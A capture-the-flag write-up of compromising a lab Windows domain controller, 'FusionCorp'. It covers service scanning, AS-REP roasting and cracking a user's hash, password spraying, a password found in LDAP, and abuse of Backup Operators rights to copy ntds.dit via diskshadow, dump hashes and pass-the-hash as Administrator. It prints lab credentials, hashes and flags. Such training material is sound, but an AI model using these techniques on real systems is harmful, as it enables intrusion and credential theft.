
# CTF Writeup: FusionCorp

---
## Reconnaissance

An initial scan revealed the following information about running services on the target server.

```
nmap -n -Pn -sS -p- 10.112.161.66 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-18 09:10 -0500
Nmap scan report for 10.112.161.66
Host is up (0.012s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
9389/tcp  open  adws
49666/tcp open  unknown
49667/tcp open  unknown
49674/tcp open  unknown
49675/tcp open  unknown
49679/tcp open  unknown
49700/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 105.58 seconds
```

Another scan provided us with detailled information about the running services.

```
nmap -n -Pn -sSCV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,3389,9389,49666,49674,49675,49679,49700 10.112.161.66
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-18 09:12 -0500
Nmap scan report for 10.112.161.66
Host is up (0.011s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: eBusiness Bootstrap Template
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-18 14:12:44Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fusion.corp, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fusion.corp, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Fusion-DC.fusion.corp
| Not valid before: 2026-07-17T14:09:17
|_Not valid after:  2027-01-16T14:09:17
|_ssl-date: 2026-07-18T14:14:12+00:00; -3s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: FUSION
|   NetBIOS_Domain_Name: FUSION
|   NetBIOS_Computer_Name: FUSION-DC
|   DNS_Domain_Name: fusion.corp
|   DNS_Computer_Name: Fusion-DC.fusion.corp
|   Product_Version: 10.0.17763
|_  System_Time: 2026-07-18T14:13:32+00:00
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49700/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: FUSION-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-07-18T14:13:33
|_  start_date: N/A
|_clock-skew: mean: -3s, deviation: 0s, median: -3s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.87 seconds
```

The target system is an Domain Controller and I was able to identify the domain itself "fusion.corp" the Hostname "FUSION-DC" and the virtual host "FUSION-DC.fusion.corp" let's map all 3 to the target ip in our local dns file.

```
echo "10.112.161.66 fusion.corp FUSION-DC.fusion.corp FUSION-DC" | tee -a /etc/hosts
```

Upon viewing the webpage we identify multiple potential user acounts and stored them in an users.txt wordlist file on our local machine.

```
jhon.mickel
andrew.arnold
lellien.linda
jhon.powel
```

I was also able to identify blog posting functionality, which provided us information about an admin and an "demo" account.

I decided to enumerate endpoints on the webpage using the tool "feroxbuster".

```
feroxbuster --url http://10.112.161.66
```

It found an interesting /backup endpoint in which we were able to retrieve an "employee.ods" file. Downloaded this one onto my local machine.

Opening up it using LibreOffice Calc it provides us with 12 usernames.

```
jmickel
aarnold
llinda
jpowel
dvroslav
tjefferson
nmaurin
mladovic
lparker
kgarland
dpertersen
```

Tested if I have authentication as anonymous or guest user, but anonymous is denied & guest user is disabled.

We somehow need to find an valid password.

I tried to find more endpoints with gobuster & dirsearch, but couldn't find anything useful. The Source Code also doesn't reveal anything promising.
I continued with enumerating subdomains, but I wasn't able to identify anything useful there too.

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://10.112.161.66 -H "Host: FUZZ.fusion.corp" -fs 53888
```

I decided to move on with ASREP-Roasting to potentially get an TGT for an user.

```
impacket-GetNPUsers -dc-ip 10.112.161.61 fusion.corp/ -usersfile users.txt -no-pass
```

But this didn't workout! So I utilized the python version of GetNPUsers.

```
/usr/share/doc/python3-impacket/examples/GetNPUsers.py fusion.corp/ -usersfile users.txt -dc-ip 10.112.161.66
```

Was able to identify an TGT for user "lparker".

Bruteforced the TGT using john the ripper and successfully gained an password.

```
john lparker --wordlist=/usr/share/wordlists/rockyou.txt                   
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!!abbylvzsvs2k6! ($krb5asrep$23$lparker@FUSION.CORP)     
1g 0:00:00:04 DONE (2026-07-18 09:39) 0.2450g/s 603105p/s 603105c/s 603105C/s !@#$%&..เต้รักไวนื
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

We now have Credentials.

```
lparker:!!abbylvzsvs2k6!
```

Sprayed the identified credentials against multiple services and found out that we can login via evil-winrm!

```
nxc winrm 10.112.161.66 -u lparker -p '!!abbylvzsvs2k6!'
```

Connected to the Domain Controller as user "lparker".

```
evil-winrm -i 10.112.161.66 -u lparker -p '!!abbylvzsvs2k6!'
```

Retrieved flag.txt in C:\Users\lparker\Desktop.

```
THM{c105b6fb249741b89432fada8218f4ef}
```

## Privilege Escalation

I checked which groups & permissions my current user session has, but wasn't able to identify anything useful.

```
whoami /all
```

On the Domain Controller are only 4 Accounts in total.

```
Administrator
jmurphy
lparker
Public
```

In the Root there is interesting Shares called "badr" and "stuff" the stuff one is empty and the badr doesn't look like it can provide us anything useful. 

Before starting to enumerate everything I wanted to download domain information and upload it in bloodhound to see potential attack paths.

Started up neo4j & bloodhound on my local machine.

```
neo4j console
bloodhound
```

Downloaded all available domain information.

```
bloodhound-python -u lparker -p '!!abbylvzsvs2k6!' -ns 10.112.161.66 -d fusion.corp -c all
```

Parallely I ran ldapsearch to enumerate LDAP.

```
ldapsearch -H "ldap://fusion.corp" -D lparker@fusion.corp -w '!!abbylvzsvs2k6!' -b "dc=fusion,dc=corp" "*" > ldapsearch.txt
```

I was able to enumerate an password in the description tag of ldap.

```
cat ldapsearch.txt | grep description
```

I added the previously discovered user account "jmurphy" to my users.txt and the freshly discovered password to my passwords.txt file.

```
jmurphy:u8WC3!kLsgw=#bRY
```

Sprayed Credentials again with NXC.

```
nxc winrm 10.112.161.66 -u creds/users.txt -p creds/passwords.txt --continue-on-success
```

We can get Shell as user jmurphy via evil-winrm.

```
evil-winrm -i 10.112.161.66 -u jmurphy -p 'u8WC3!kLsgw=#bRY'
```

Retrieved flag.txt in C:\Users\jmurphy\Desktop.

```
THM{b4aee2db2901514e28db4242e047612e}
```

Enumerated Groups & Permissions of user "jmurphy" and identified that he is part of the "Backup Operators" Group & has the "SeBackupPrivilege" open.

This means we are able to extract the SAM & SYSTEM File out of the Windows Registry Hive and download it onto our local machine to dump all NTLM Hashes of all Domain Users.

```
reg save HKLM\SAM C:\Temp\SAM
```

```
reg save HKLM\SYSTEM C:\Temp\SYSTEM
```

Since we are in an evil-winrm Session we can utilize the "download" functionality to get the files quickly onto our local machine.

```
download SAM
download SYSTEM
```

Utilized the tool "secretsdump" to dump all domain user hashes.

```
/usr/share/doc/python3-impacket/examples/secretsdump.py -system SYSTEM -sam SAM local
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xeafd8ccae4277851fc8684b967747318
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2182eed0101516d0a206b98c579565e6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up...
```

I tried to authenticate as Administrator with multiple tools, but none worked! This is because I need the domain Administrator Account which I can get by dumping the NTDS.dit file (AD Database File), jmurphy is an domain admin which allows us to actually dump this file, but I need to create an shadow copy of the C:\Drive and then download the ntds.dit file from there, since the ntds.dit file gets used by active directory 24/7 which doesnt allow us to extract it just now.
This template creates an snapshot or shadow copy of the C:\ Drive and exports it into an E:\ Drive. We can then view the NTDS.dit file in there and download it onto our local machine.

Saved this content into an script.txt file on the local machine.

```
set verbose on  
set metadata C:\Windows\Temp\test.cab  
set context persistent  
add volume C: alias cdrive  
create  
expose %cdrive% E:
```

Since Linux uses LF line endings and windows uses CRLF. We'll need to modify the script with another command in order to eliminate any errors.

```
unix2dos script.txt
```

We can now upload the script to the target.

```
upload script.txt
```

I then ran the windows in-built utility diskshadow.exe which allows me to create an copy of the C:\ Drive.

```
diskshadow /s script.txt
```

We can confirm if it worked.

```
dir E:\
```

To copy the NTDS.dit file we will utilize the windows in-built tool called "robocopy", because it is saver for big files.

```
robocopy /b E:\Windows\ntds . ntds.dit
```

This ensures that the Active Directory Database File is in our current Drive & Directory.

I then downloaded the file to my local machine.

```
download ntds.dit
```

Utilized secretsdump.py in order to dump all domain hashes.

```
/usr/share/doc/python3-impacket/examples/secretsdump.py -system SYSTEM -ntds ntds.dit local
```

I successfully dumped all domain hashes and authenticated as Administrator User to the Domain Controller to get SYSTEM Shell via WMIEXEC.

```
impacket-wmiexec Administrator@fusion.corp -hashes aad3b435b51404eeaad3b435b51404ee:9653b02d945329c7270525c4c2a69c67
```

Retrieved flag.txt in C:\Users\Administrator\Desktop.

```
THM{f72988e57bfc1deeebf2115e10464d15}
```